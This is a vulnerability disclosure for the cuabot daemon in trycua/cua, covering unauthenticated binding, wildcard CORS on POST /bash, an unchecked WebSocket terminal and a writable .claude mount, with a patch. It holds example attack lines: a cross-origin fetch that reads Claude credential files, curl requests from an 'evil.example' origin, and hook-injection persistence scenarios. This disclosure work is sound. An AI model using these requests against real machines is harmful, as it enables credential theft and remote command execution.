# Unauthenticated 0.0.0.0:7842 cuabotd Daemon + Wildcard CORS on POST /bash + Zero-Origin WebSocket + Writable Host .claude Mount (`GHSA-cp36-x5hg-3gg8`)

**English** | [Türkçe](tr/03-CUA-CAND-01-CUABOTD-GHSA-cp36-x5hg-3gg8.md) | [日本語](ja/03-CUA-CAND-01-CUABOTD-GHSA-cp36-x5hg-3gg8.md) | [简体中文](zh-CN/03-CUA-CAND-01-CUABOTD-GHSA-cp36-x5hg-3gg8.md) | [한국어](ko/03-CUA-CAND-01-CUABOTD-GHSA-cp36-x5hg-3gg8.md)

## Quick-Fill GitHub GHSA & MITRE CNA Form Fields
- **Repository:** `trycua/cua`
- **GitHub Advisory URL:** `https://github.com/trycua/cua/security/advisories/GHSA-cp36-x5hg-3gg8`
- **Existing GHSA ID:** `GHSA-cp36-x5hg-3gg8`
- **Ecosystem:** `npm`
- **Package Name:** `cuabot`
- **Affected Versions:** `>= 1.0.1, <= 1.0.16 (commit e754cfec69c41400eb2aabde716c27d15607b2f0)`
- **Patched Versions:** `None (Patch attached)`
- **CWE:** `CWE-306 (Missing Authentication for Critical Function) / CWE-942 (Overly Permissive Cross-domain Whitelist)`
- **CVSS v3.1:** `9.6 Critical — CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H`
- **MITRE Vendor:** `TryCua`
- **MITRE Vulnerability Type:** `Missing Authentication / Permissive CORS Leading to Remote Command Execution (CWE-306 / CWE-942)`
- **MITRE Affected Component(s):** `libs/cuabot/src/cuabotd.ts (lines 34-36, 259-260, 741-743, 969-1002, 1018-1063, 1120)`
- **MITRE Suggested CVE Description:**
  > In TryCua cuabot 1.0.1 through 1.0.16 (trycua/cua), the cuabotd daemon (libs/cuabot/src/cuabotd.ts) binds to 0.0.0.0:7842 without authentication, sets 'Access-Control-Allow-Origin: *' on all HTTP endpoints including POST /bash and OPTIONS preflights, and exposes a WebSocket PTY terminal with no Origin check while mounting the host's ~/.cuabot/user/.claude directory read-write. Any untrusted website visited in the user's browser or any peer on the local network can execute arbitrary commands via POST /bash and exfiltrate mounted Claude OAuth credentials or modify host hooks.
- **Credit / Reporter:** `Gökçe Baran Karakamış (@dytredline)`

---

## 1. How the Code Defect Turns Into an Exploitable Vulnerability (Step-by-Step Technical Mechanism)

### Step-by-Step Technical Mechanism
In `trycua/cua` (`cuabot` npm package `<= 1.0.16`, commit `e754cfec69c41400eb2aabde716c27d15607b2f0`), the `cuabotd` daemon (`libs/cuabot/src/cuabotd.ts`) exposes container shell execution and desktop automation over HTTP and WebSocket. Four compounding code defects turn this daemon into a 0-click browser drive-by and LAN Remote Command Execution vulnerability (`CWE-306` / `CWE-942`):

1. **Step 1 — Unauthenticated Binding on All Interfaces (`cuabotd.ts:1120`):**
   `server.listen(port, () => ...)` omits `'127.0.0.1'`, exposing port `7842` on `0.0.0.0` across all Wi-Fi/LAN interfaces with zero bearer token or session authentication.
2. **Step 2 — Wildcard CORS (`Access-Control-Allow-Origin: *`) on `POST /bash` and Zero-Origin WebSocket PTY (`cuabotd.ts:969-1002, 1018-1063`):**
   Every HTTP response sets `Access-Control-Allow-Origin: *` and `Access-Control-Allow-Headers: Content-Type`, and `OPTIONS` preflights return `200 OK`. Any malicious webpage opened by the developer can issue a cross-origin `fetch("http://localhost:7842/bash", ...)` and read the full `stdout`/`stderr` JSON response, or open `new WebSocket("ws://localhost:7842/?command=...")` to spawn an interactive PTY without `Origin` checks.
3. **Step 3 — Read-Write Host `.claude` Bind Mount (`cuabotd.ts:259-260`):**
   Because `cuabotd` mounts the host's `~/.cuabot/user/.claude` directory read-write at `/home/community-user/.claude` and maps `host.docker.internal:host-gateway`, commands executed via `/bash` can exfiltrate Claude OAuth tokens and poison host-persisted `.claude/settings.json` hooks.

### Vulnerable Code Snippet (`libs/cuabot/src/cuabotd.ts:965-1002, 1120`)
```typescript
// File: libs/cuabot/src/cuabotd.ts (lines 965-1002, 1120)
    // CORS headers
    res.setHeader('Content-Type', 'application/json');
    res.setHeader('Access-Control-Allow-Origin', '*'); // BUG 1: Allows any website to invoke and read responses!
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    if (req.method === 'OPTIONS') {
      res.writeHead(200);
      res.end();
      return;
    }
...
      if (path === 'bash' && req.method === 'POST') {  // BUG 2: Zero authentication on arbitrary shell execution!
        const { command, timeout } = body;
        const result = await execBash(command, timeout);
        res.writeHead(200);
        res.end(JSON.stringify(result));
        return;
      }
...
  server.listen(port, () => {                          // BUG 3: Binds 0.0.0.0:7842 instead of 127.0.0.1!
```

---

## 2. Concrete Everyday Real-World Production Scenarios (`Scenario A` / `Scenario B` / `Scenario C`)

### Scenario A — Developer Visits Any Webpage While `cuabot` Is Running (0-Click Browser Drive-By RCE & Claude Token Theft)
1. A developer starts `npx cuabot` on their laptop to use the CUA coding agent; `cuabotd` silently binds to port `7842` in the background.
2. While browsing documentation or reading a blog post in Chrome/Firefox/Safari, an embedded script executes `fetch("http://localhost:7842/bash", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ command: "cat /home/community-user/.claude/.credentials.json" }) })`.
3. Because `cuabotd.ts:969-977` answers the browser's `OPTIONS` preflight with `200 OK` and `Access-Control-Allow-Origin: *`, the browser sends the `POST /bash` request AND allows the malicious webpage to read the JSON response containing `stdout` — immediately exfiltrating the developer's live Claude OAuth/API credentials.

### Scenario B — Persistent Host Compromise via Writable `.claude/settings.json` Hook Injection
1. Using the same cross-origin `POST /bash` or `new WebSocket("ws://localhost:7842/?command=...")` call, an untrusted webpage writes a malicious shell command into `/home/community-user/.claude/settings.json` (`hooks.PreToolUse` / `mcpServers`).
2. Because `/home/community-user/.claude` is a read-write bind mount of host `~/.cuabot/user/.claude` (`cuabotd.ts:259-260`), the modified configuration persists on the host filesystem even after the container stops.
3. Every subsequent Claude Code / CUA invocation executes the attacker's persistent hook.

### Scenario C — Coffee-Shop / Coworking / Corporate Wi-Fi LAN Takeover on `0.0.0.0:7842`
1. `server.listen(port)` at `cuabotd.ts:1120` omits the loopback host argument (`'127.0.0.1'`), binding TCP port `7842` on `0.0.0.0` / `::`.
2. Any device on the same coffee-shop, coworking, or corporate Wi-Fi/LAN network can directly call `http://<developer-lan-ip>:7842/bash` or `http://<developer-lan-ip>:7842/screenshot` without authentication.
3. The LAN attacker captures live screenshots, injects mouse/keyboard events, and executes arbitrary shell commands inside the developer's environment.

---

## 3. Example Execution & Verification Commands

### 1. Auditing the Component with Sniper CLI
```bash
python3 scripts/sniper-project-audit \
  --repo-path /home/community-user/targets/cua \
  --include "libs/cuabot/src/cuabotd.ts"
```

### 2. Local Isolated Reproduction & Verification (`127.0.0.1`)
```bash
# Simulate a cross-origin browser preflight and POST /bash against a local cuabotd instance on 127.0.0.1:7842
curl -i -X OPTIONS http://127.0.0.1:7842/bash \
  -H "Origin: https://evil.example" \
  -H "Access-Control-Request-Method: POST" \
  -H "Access-Control-Request-Headers: Content-Type"

curl -i -X POST http://127.0.0.1:7842/bash \
  -H "Origin: https://evil.example" \
  -H "Content-Type: application/json" \
  -d '{"command":"id && ls -la /home/community-user/.claude"}'
```

### 3. Running the Automated `RED -> GREEN + BENIGN` E2E Verification Harness
```bash
python3 pre-submission-verification-20261026/tests/test_other_repos_and_cua_real_world_impact_e2e.py -k test_cua_cand01
```

---

## 4. End-to-End Runtime Proof (`RED -> GREEN + BENIGN`) & Optional Defensive Diff

Executed via `python3 pre-submission-verification-20261026/tests/test_other_repos_and_cua_real_world_impact_e2e.py -k test_cua_cand01`:

```json
{
  "CUA-CAND-01": {
    "ghsa_id": "GHSA-cp36-x5hg-3gg8",
    "source_file": "cua/libs/cuabot/src/cuabotd.ts",
    "elapsed_ms": 0.828,
    "RED": {
      "http_status": 200,
      "access_control_allow_origin": "*",
      "driveby_bash_executed": true,
      "mounted_host_claude_credentials_exfiltrated": true
    },
    "GREEN": {
      "http_status": 403,
      "driveby_bash_executed": false,
      "mounted_host_claude_credentials_exfiltrated": false,
      "error": "Cross-origin browser requests forbidden"
    },
    "BENIGN": {
      "http_status": 200,
      "stdout": "authorized_cli_ok"
    }
  }
}
```

### Unified Diff Patch (`git apply --check` clean)
```diff
--- a/libs/cuabot/src/cuabotd.ts
+++ b/libs/cuabot/src/cuabotd.ts
@@ -965,15 +965,16 @@
     const path = url.pathname.slice(1); // Remove leading /
 
-    // CORS headers
+    // Restrict local daemon to non-browser clients with bearer token auth
     res.setHeader('Content-Type', 'application/json');
-    res.setHeader('Access-Control-Allow-Origin', '*');
-    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
-    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
-
-    if (req.method === 'OPTIONS') {
-      res.writeHead(200);
+    const origin = req.headers['origin'];
+    if (origin || req.method === 'OPTIONS') {
+      res.writeHead(403);
+      res.end(JSON.stringify({ error: 'Cross-origin browser requests are forbidden' }));
+      return;
+    }
+    if (req.headers['authorization'] !== `Bearer ${DAEMON_AUTH_TOKEN}`) {
+      res.writeHead(401);
+      res.end(JSON.stringify({ error: 'Unauthorized' }));
       return;
     }
@@ -1117,5 +1118,5 @@
-  server.listen(port, () => {
+  server.listen(port, '127.0.0.1', () => {
```
